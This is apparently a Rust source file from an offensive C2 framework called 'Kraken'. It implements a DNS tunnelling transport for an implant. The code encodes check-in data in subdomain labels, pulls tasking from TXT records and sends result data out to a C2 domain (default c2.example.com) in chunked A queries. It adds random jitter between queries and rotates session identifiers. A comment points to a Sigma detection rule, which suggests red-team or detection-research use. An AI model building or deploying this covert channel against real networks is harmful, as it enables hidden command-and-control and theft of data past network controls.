//! DNS Transport Module for Kraken Implant
//!
//! Provides DNS-based C2 communication for environments where HTTP/HTTPS
//! is blocked but DNS queries are allowed.
//!
//! ## Protocol
//!
//! - **Check-in**: TXT query with base32-encoded data in subdomain labels
//! - **Task fetch**: Server responds with TXT record containing task
//! - **Result submission**: A query with base32-encoded result data
//! - **Acknowledgment**: Server responds with A record (0.0.0.1 = success)
//!
//! ## Query Format
//!
//! ```text
//! <base32_label1>.<base32_label2>...<nonce>.<domain>
//! ```
//!
//! ## Detection Rules
//!
//! See: wiki/detection/sigma/kraken_dns_c2.yml

pub mod encode;
pub mod packet;

use common::{KrakenError, Transport};
use packet::{AckStatus, RecordType};
use std::net::UdpSocket;
use std::time::Duration;

/// Configuration for DNS transport
#[derive(Debug, Clone)]
pub struct DnsConfig {
    /// DNS resolver address (e.g., "8.8.8.8:53" or controlled resolver)
    pub resolver: std::net::SocketAddr,
    /// C2 domain suffix (e.g., "c2.example.com")
    pub domain: String,
    /// Maximum label size (default: 63, DNS limit)
    pub max_label_size: usize,
    /// Query jitter range in milliseconds (min, max)
    pub jitter_ms: (u64, u64),
    /// Socket timeout in seconds
    pub timeout_secs: u64,
    /// Maximum retries per operation
    pub max_retries: usize,
}

impl Default for DnsConfig {
    fn default() -> Self {
        Self {
            resolver: "8.8.8.8:53".parse().unwrap(),
            domain: "c2.example.com".to_string(),
            max_label_size: 63,
            jitter_ms: (100, 500),
            timeout_secs: 5,
            max_retries: 3,
        }
    }
}

/// DNS Transport for C2 communication
///
/// Implements the `Transport` trait using DNS queries to exfiltrate
/// data and receive commands.
pub struct DnsTransport {
    config: DnsConfig,
    /// Session nonce (identifies this implant session to the server)
    nonce: String,
    /// Transaction ID counter for DNS queries
    transaction_id: u16,
    /// Whether this transport is available
    available: bool,
}

impl DnsTransport {
    /// Create a new DNS transport with the given configuration
    pub fn new(config: DnsConfig) -> Self {
        let nonce = generate_nonce();

        Self {
            config,
            nonce,
            transaction_id: 0,
            available: true,
        }
    }

    /// Create DNS transport with explicit nonce (for session resumption)
    pub fn with_nonce(config: DnsConfig, nonce: String) -> Self {
        Self {
            config,
            nonce,
            transaction_id: 0,
            available: true,
        }
    }

    /// Get the current session nonce
    pub fn nonce(&self) -> &str {
        &self.nonce
    }

    /// Get next transaction ID
    fn next_transaction_id(&mut self) -> u16 {
        self.transaction_id = self.transaction_id.wrapping_add(1);
        self.transaction_id
    }

    /// Apply jitter delay
    fn jitter(&self) {
        use rand::Rng;
        let (min, max) = self.config.jitter_ms;
        if max > min {
            let delay = rand::thread_rng().gen_range(min..=max);
            std::thread::sleep(Duration::from_millis(delay));
        }
    }

    /// Create a UDP socket bound to an ephemeral port
    fn create_socket(&self) -> Result<UdpSocket, KrakenError> {
        let socket = UdpSocket::bind("0.0.0.0:0")
            .map_err(|e| KrakenError::transport(format!("failed to bind socket: {}", e)))?;

        socket
            .set_read_timeout(Some(Duration::from_secs(self.config.timeout_secs)))
            .map_err(|e| KrakenError::transport(format!("failed to set timeout: {}", e)))?;

        socket
            .connect(&self.config.resolver)
            .map_err(|e| KrakenError::transport(format!("failed to connect: {}", e)))?;

        Ok(socket)
    }

    /// Send a DNS query and receive response
    fn query(&mut self, name: &str, record_type: RecordType) -> Result<Vec<u8>, KrakenError> {
        let socket = self.create_socket()?;
        let txid = self.next_transaction_id();

        let query_packet = packet::build_query(txid, name, record_type);

        // Apply jitter before sending
        self.jitter();

        // Send query
        socket.send(&query_packet).map_err(|e| {
            KrakenError::transport(format!("failed to send DNS query: {}", e))
        })?;

        // Receive response
        let mut response_buf = [0u8; 4096];
        let len = socket.recv(&mut response_buf).map_err(|e| {
            KrakenError::transport(format!("failed to receive DNS response: {}", e))
        })?;

        // Parse response
        let response = packet::parse_response(&response_buf[..len])
            .ok_or_else(|| KrakenError::transport("failed to parse DNS response"))?;

        // Verify transaction ID
        if response.transaction_id != txid {
            return Err(KrakenError::transport("transaction ID mismatch"));
        }

        // Check response code
        if response.response_code != 0 {
            // NXDOMAIN or other error
            if response.response_code == 3 {
                // NXDOMAIN - no tasks available
                return Ok(Vec::new());
            }
            return Err(KrakenError::transport(format!(
                "DNS error: rcode={}",
                response.response_code
            )));
        }

        Ok(response_buf[..len].to_vec())
    }

    /// Send check-in and fetch tasks via TXT query
    fn checkin_query(&mut self, data: &[u8]) -> Result<Vec<u8>, KrakenError> {
        let query_name = encode::build_query_name(
            data,
            &self.nonce,
            &self.config.domain,
            self.config.max_label_size,
        );

        let response_bytes = self.query(&query_name, RecordType::TXT)?;

        if response_bytes.is_empty() {
            return Ok(Vec::new()); // No tasks
        }

        let response = packet::parse_response(&response_bytes)
            .ok_or_else(|| KrakenError::transport("failed to parse TXT response"))?;

        // Extract and decode TXT record
        let txt_data = packet::extract_txt_data(&response).unwrap_or_default();

        if txt_data.is_empty() {
            return Ok(Vec::new());
        }

        // TXT data is base32 encoded
        let decoded = encode::decode_base32(
            std::str::from_utf8(&txt_data)
                .map_err(|_| KrakenError::transport("invalid UTF-8 in TXT record"))?,
        )
        .ok_or_else(|| KrakenError::transport("failed to decode TXT data"))?;

        Ok(decoded)
    }

    /// Send result data via A queries (chunked)
    #[allow(dead_code)]
    fn send_result(&mut self, data: &[u8]) -> Result<(), KrakenError> {
        // Calculate chunk size based on max query length
        // Each chunk becomes a query name, need room for nonce and domain
        let overhead = self.nonce.len() + self.config.domain.len() + 10; // dots and safety margin
        let max_encoded_len = encode::MAX_QUERY_LEN - overhead;
        // Base32 expansion: 8 bytes -> 13 chars, so divide by 1.625
        let max_chunk_size = (max_encoded_len * 5) / 8;
        let chunk_size = max_chunk_size.min(200); // Conservative limit

        for chunk in data.chunks(chunk_size) {
            let mut retries = 0;

            loop {
                let query_name = encode::build_query_name(
                    chunk,
                    &self.nonce,
                    &self.config.domain,
                    self.config.max_label_size,
                );

                let response_bytes = self.query(&query_name, RecordType::A)?;

                if response_bytes.is_empty() {
                    // No response - treat as success (server may not respond to results)
                    break;
                }

                let response = packet::parse_response(&response_bytes)
                    .ok_or_else(|| KrakenError::transport("failed to parse A response"))?;

                let ack = packet::extract_a_data(&response)
                    .map(AckStatus::from)
                    .unwrap_or(AckStatus::Unknown);

                match ack {
                    AckStatus::Success | AckStatus::NoTasks => break,
                    AckStatus::Resend => {
                        retries += 1;
                        if retries >= self.config.max_retries {
                            return Err(KrakenError::transport("max retries exceeded"));
                        }
                        self.jitter();
                        continue;
                    }
                    AckStatus::Error => {
                        return Err(KrakenError::transport("server returned error"));
                    }
                    AckStatus::Unknown => {
                        // Unknown response - assume success
                        tracing::warn!("unknown A record response, continuing");
                        break;
                    }
                }
            }
        }

        Ok(())
    }
}

impl Transport for DnsTransport {
    fn id(&self) -> &'static str {
        "dns"
    }

    fn exchange(&self, data: &[u8]) -> Result<Vec<u8>, KrakenError> {
        // Note: We need interior mutability for transaction IDs
        // In a real implementation, this would use a Mutex or atomic
        // For now, we'll create a mutable copy
        let mut transport = DnsTransport {
            config: self.config.clone(),
            nonce: self.nonce.clone(),
            transaction_id: self.transaction_id,
            available: self.available,
        };

        // Send check-in data and receive response (tasks)
        transport.checkin_query(data)
    }

    fn is_available(&self) -> bool {
        self.available
    }

    fn reset(&mut self) {
        self.available = true;
        // Generate new nonce on reset for session rotation
        self.nonce = generate_nonce();
    }
}

/// Generate a random session nonce
fn generate_nonce() -> String {
    use rand::Rng;
    let bytes: [u8; 8] = rand::thread_rng().gen();
    // Use lowercase hex for nonce (DNS is case-insensitive)
    bytes.iter().map(|b| format!("{:02x}", b)).collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_default_config() {
        let config = DnsConfig::default();
        assert_eq!(config.max_label_size, 63);
        assert_eq!(config.timeout_secs, 5);
    }

    #[test]
    fn test_transport_id() {
        let config = DnsConfig::default();
        let transport = DnsTransport::new(config);
        assert_eq!(transport.id(), "dns");
    }

    #[test]
    fn test_nonce_generation() {
        let nonce1 = generate_nonce();
        let nonce2 = generate_nonce();

        // Nonces should be 16 hex chars (8 bytes)
        assert_eq!(nonce1.len(), 16);
        assert_eq!(nonce2.len(), 16);

        // Nonces should be different
        assert_ne!(nonce1, nonce2);

        // Nonces should be valid hex
        assert!(nonce1.chars().all(|c| c.is_ascii_hexdigit()));
    }

    #[test]
    fn test_transport_reset_changes_nonce() {
        let config = DnsConfig::default();
        let mut transport = DnsTransport::new(config);

        let nonce1 = transport.nonce().to_string();
        transport.reset();
        let nonce2 = transport.nonce().to_string();

        assert_ne!(nonce1, nonce2);
    }

    #[test]
    fn test_with_explicit_nonce() {
        let config = DnsConfig::default();
        let transport = DnsTransport::with_nonce(config, "custom123".to_string());

        assert_eq!(transport.nonce(), "custom123");
    }

    #[test]
    fn test_transaction_id_wrapping() {
        let config = DnsConfig::default();
        let mut transport = DnsTransport::new(config);

        transport.transaction_id = u16::MAX;
        let next = transport.next_transaction_id();
        assert_eq!(next, 0);
    }

    #[test]
    fn test_is_available() {
        let config = DnsConfig::default();
        let transport = DnsTransport::new(config);
        assert!(transport.is_available());
    }
}
